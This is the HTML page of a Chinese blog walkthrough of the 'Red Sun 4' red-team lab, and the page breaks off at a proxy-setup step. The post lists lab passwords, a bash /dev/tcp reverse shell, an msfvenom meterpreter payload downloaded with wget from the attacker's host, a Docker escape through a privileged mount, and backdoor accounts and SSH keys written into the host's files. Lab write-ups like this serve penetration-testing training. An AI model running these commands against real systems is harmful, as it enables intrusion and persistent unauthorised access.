@@ -1,0 +1,882 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102106828.png">
+  <link rel="icon" href="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102106828.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="QY">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ATT&amp;CK红队评估（红日靶场四）靶场搭建共有三台主机DC、WEB、WIN7 机器密码WEB主机 ubuntu:ubuntu WIN7主机 douser:Dotest123 (DC)WIN2008主机 administrator:Test2008 网络配置首先创建子网vmnet1   WEB服务机配置如下   DC机和WIN7配置均如下     攻击机kali的网卡和WEB主机的第一个出网">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场4">
+<meta property="og:url" content="http://example.com/2023/04/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/index.html">
+<meta property="og:site_name" content="yaya-blog">
+<meta property="og:description" content="ATT&amp;CK红队评估（红日靶场四）靶场搭建共有三台主机DC、WEB、WIN7 机器密码WEB主机 ubuntu:ubuntu WIN7主机 douser:Dotest123 (DC)WIN2008主机 administrator:Test2008 网络配置首先创建子网vmnet1   WEB服务机配置如下   DC机和WIN7配置均如下     攻击机kali的网卡和WEB主机的第一个出网">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304020921847.jpg">
+<meta property="article:published_time" content="2023-04-02T01:19:01.000Z">
+<meta property="article:modified_time" content="2023-04-03T01:07:54.671Z">
+<meta property="article:author" content="QY">
+<meta property="article:tag" content="靶场wp">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304020921847.jpg">
+  
+  
+  
+  <title>红日靶场4 - yaya-blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="yaya-blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Yaya&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102101423.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="红日靶场4"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-02 09:19" pubdate>
+          2023年4月2日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          32 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">红日靶场4</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ATT-amp-CK红队评估（红日靶场四）"><a href="#ATT-amp-CK红队评估（红日靶场四）" class="headerlink" title="ATT&amp;CK红队评估（红日靶场四）"></a>ATT&amp;CK红队评估（红日靶场四）</h1><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>共有三台主机DC、WEB、WIN7</p>
+<h3 id="机器密码"><a href="#机器密码" class="headerlink" title="机器密码"></a><strong>机器密码</strong></h3><p>WEB主机 ubuntu:ubuntu</p>
+<p>WIN7主机 douser:Dotest123</p>
+<p>(DC)WIN2008主机 administrator:Test2008</p>
+<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>首先创建子网vmnet1</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304020924334.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>WEB服务机配置如下</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304020925234.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>DC机和WIN7配置均如下</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304020927046.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+
+
+<p>攻击机kali的网卡和WEB主机的第一个出网网卡一致为NAT模式</p>
+<p><strong>WEB主机（Ubuntu）上启动环境</strong></p>
+<p>​    sudo docker start ec 17 09 bb da 3d ab ad</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304020936034.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>拿到ip,打靶开始</p>
+<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>先上namp扫一波</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">80.134</span> -<span class="hljs-selector-tag">p</span>- <br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304020941222.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>发现有 22 2001 2002 2003 四个端口开着</p>
+<p>上goby扫一下</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304020943413.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+
+
+<p>发现2003端口是phpMyAdmin服务，本来想先试一下弱口令爆破，结果一访问就上去了好像没设置密码</p>
+<p>但是除了22之外有三个端口开着那估计是有三种上shell的方式</p>
+<h3 id="phpmyadmin上shell"><a href="#phpmyadmin上shell" class="headerlink" title="phpmyadmin上shell"></a>phpmyadmin上shell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> &quot;%secure%&quot;<br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304020949086.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>发现读写权限没开</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">secure_file_prive=null                <span class="hljs-regexp">//</span>不允许导入导出数据到目录<br>secure_file_priv=c:\\www           <span class="hljs-regexp">//</span>允许导入导出数据到指定目录<br>secure_file_priv=<span class="hljs-string">&#x27;&#x27;</span>                      <span class="hljs-regexp">//</span>允许导入导出数据到任意目录<br>secure_file_priv=<span class="hljs-string">&quot;/&quot;</span>                   <span class="hljs-regexp">//</span>允许导入导出数据到任意目录<br></code></pre></td></tr></table></figure>
+
+<p>再看看日志记录有没有开，可以使用日志写shell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">GLOBAL</span> VARIABLES <span class="hljs-keyword">LIKE</span> ‘<span class="hljs-operator">%</span>general<span class="hljs-operator">%</span>’<br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021000671.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>日志记录功能关闭，尝试手动打开</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">SET</span> <span class="hljs-built_in">GLOBAL</span> general_log = <span class="hljs-keyword">ON</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021006363.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>但是发现权限太低无法打不开</p>
+<h3 id="Struts2上shell"><a href="#Struts2上shell" class="headerlink" title="Struts2上shell"></a>Struts2上shell</h3><p>打开2001端口发现是Struts2</p>
+<p>用工具扫一下</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021010633.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>发现了目标存在s2-045漏洞（CVE-2017-5638）</p>
+<p>通过利用工具exp等直接进行命令执行即可</p>
+<p>kali开启监听，rce反弹shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/ip/</span>port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021018203.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>shell回弹成功</p>
+<h3 id="Tomcat上sell"><a href="#Tomcat上sell" class="headerlink" title="Tomcat上sell"></a>Tomcat上sell</h3><p>访问2002端口是Tomcat&#x2F;8.5.19</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021023769.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+
+
+<p>网上发现存在漏洞CVE-2017-12617</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021023775.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>直接上github</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cyberheartmi9/CVE-2017-12617">https://github.com/cyberheartmi9/CVE-2017-12617</a></p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021029059.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021031262.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>成功验证了漏洞的存在</p>
+<p>可以直接rce</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021032418.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>由于两种方法获取的权限都是root权限，可以直接进行下一步</p>
+<p>到处外网打点结束</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>打算先把shell弹到msf方便下一步渗透</p>
+<p>先生成一个马</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=xxx.xxx.xxx.xxx <span class="hljs-attribute">LPORT</span>=8888 -f elf &gt; mshell.elf<br></code></pre></td></tr></table></figure>
+
+<p>开启http服务通过命令执行下载</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br><span class="hljs-attribute">wget</span> http://<span class="hljs-number">192.168.80.128:8000</span>/mshell.elf<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021052861.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost xxx.xxx.xxx.xxx<br><span class="hljs-built_in">set</span> lport 8888<br>run<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x * 给予执行权限<br>./mshell.elf<br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021058339.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>成功弹回shell</p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>执行ls -al发现了Dockerfile说明是在docaker环境中，要拿下必须进行逃逸</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021131761.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>他检测是否为docker环境的方法还有这个环境检测命令，cgroup可以理解为用户和组的关系</p>
+<h3 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h3><h4 id="利用dirty-cow来进行docker逃逸"><a href="#利用dirty-cow来进行docker逃逸" class="headerlink" title="利用dirty cow来进行docker逃逸"></a>利用dirty cow来进行docker逃逸</h4><p>这种利用方法利用成功的前提是，宿主机的内核有dirty cow漏洞。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">git <span class="hljs-keyword">clone </span>GitHub - <span class="hljs-keyword">scumjr/dirtycow-vdso: </span>PoC for <span class="hljs-keyword">Dirty </span>COW (CVE<span class="hljs-number">-2016</span><span class="hljs-number">-5195</span>)<br><br>cd <span class="hljs-keyword">dirtycow-vdso</span><br><span class="hljs-keyword"></span><br>make<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>但是经过测试本机不存在这个漏洞</p>
+<h4 id="利用特权模式进行逃逸"><a href="#利用特权模式进行逃逸" class="headerlink" title="利用特权模式进行逃逸"></a>利用特权模式进行逃逸</h4><p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p>
+<p>在这里发现一个问题，通过Struts2获得的shell，的磁盘文件为空，所以利用不了</p>
+<p>所以这里使用tomcat的任意文件上传上传了一个shell</p>
+<p>生成哥斯拉shell</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021653680.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>上传</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021652857.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>连接之后执行</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">fdisk</span> -l 查看磁盘文件<br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021654774.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>有返回尝试进行挂载</p>
+<p>创建一个文件夹，将宿主机根目录挂载至容器目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"> <span class="hljs-built_in">mkdir</span> /out<br>mount /dev/sda1 /out<br><span class="hljs-built_in">cd</span> ../../../tmp<br><span class="hljs-built_in">ls</span><br>mikir <span class="hljs-built_in">test</span><br>mount /dev/sda1 <span class="hljs-built_in">test</span><br><span class="hljs-built_in">cat</span> <span class="hljs-built_in">test</span>/etc/passwd<br></code></pre></td></tr></table></figure>
+
+
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304021708448.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><p>向etc&#x2F;paawd里写入账号密码然后进行ssh连接</p>
+<p>方法1</p>
+<p>可以在相同的ubantu创建新用户复制到此文件中</p>
+<p>我这里向</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">test<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>
+
+<p>写入了</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">yaya:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:yaya</span>,,,<span class="hljs-symbol">:/home/yaya</span><span class="hljs-symbol">:/usr/bin/zsh</span><br></code></pre></td></tr></table></figure>
+
+<p>向</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">test<span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure>
+
+<p>写入密钥</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">yaya:</span><span class="hljs-variable">$y</span><span class="hljs-variable">$j9T</span><span class="hljs-variable">$TISw4upU4y08IrsHahZwe</span>.<span class="hljs-variable">$FQ5rY2TlIClHPBngJtmBDKpf1PdcvkwHT</span>..<span class="hljs-symbol">C3HuOf12:</span><span class="hljs-number">19273</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">99999</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span>:::<br>systemd-<span class="hljs-symbol">coredump:</span>!*<span class="hljs-symbol">:</span><span class="hljs-number">19273</span>::::::<br></code></pre></td></tr></table></figure>
+
+<p>方法2</p>
+<p>这里直接写入ssh-keygen公钥连接</p>
+<p>先在kali生成公钥和密钥</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span>  <br></code></pre></td></tr></table></figure>
+
+<p>执行之后会生成一个密码文件</p>
+<p>讲内容写入目标靶机</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0y3RzGTTLabQjOv0QALZnrPq1Rf2gGOwNZ+AIGVGHHVWun5MZhJRo+FBGhAVrFIwvYchZzKRs8T8W7YmsSBHykKMR6LfpYl1QOXop2eCSOTwj8dfYgPFv22d7pdYK4Vicmwu9RIpcqAdrZ1E0N+WgdIxDz7/rHi9Tku7o2DkFekvMM6UOkmGo7CL0C17iAyRmAlIOBV/+oz6MdPQOSJ4BpcvS6U9kS3dJli8fNDylt+wWH4Uh5CbuJnfJDiOkm+Tvxw6qBpv9t5v1iWK3cXwFc60g2oGm68fuBV1mrLEQQVdcpj8xczWfMzJFOxWBHSVWWcwHT7L+BI6SKvXtOlLtRJbZ+KtKBGXRF/XKMyjjtd35b5Ol5Ounn7OEqrE1/epQbJ7NjDj2apNcpg+xIZQpLJIj9qREDdtpkFmii8XsZnZr/uBy2D5wUMpFinE9RMGoqcxj1BWIXclrQy94e1Vjyd6n/JtirspLMNOhSxjNuydewq0pd9VwQkcEhYaIZ9U= yaya@kali&#x27;</span> &gt;&gt; test<span class="hljs-regexp">/home/u</span>buntu<span class="hljs-regexp">/.ssh/</span>authorized_keys<br></code></pre></td></tr></table></figure>
+
+<p>连接上ssh之后才算拿下了这台机器</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304030848349.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>发现第二块网卡,应该是内网网卡，因此我们上传scaninfo进行信息收集</p>
+<p>为了方便上传直接上ssh工具</p>
+<p>上传之后执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span>  777 ./scaninfo_linux_x64<br>./scaninfo_linux_x64 -i 192.168.183.1/24<br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304030852421.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>工具真是好用</p>
+<p>探测到有三个主机存活，那么应该是一台域内个人机和DC，还顺便扫到了MS17-010</p>
+<p>经典永恒之蓝</p>
+<p>搭个代理直接上msf</p>
+<p>代理工具选择frp</p>
+<p>配置文件frps.ini</p>
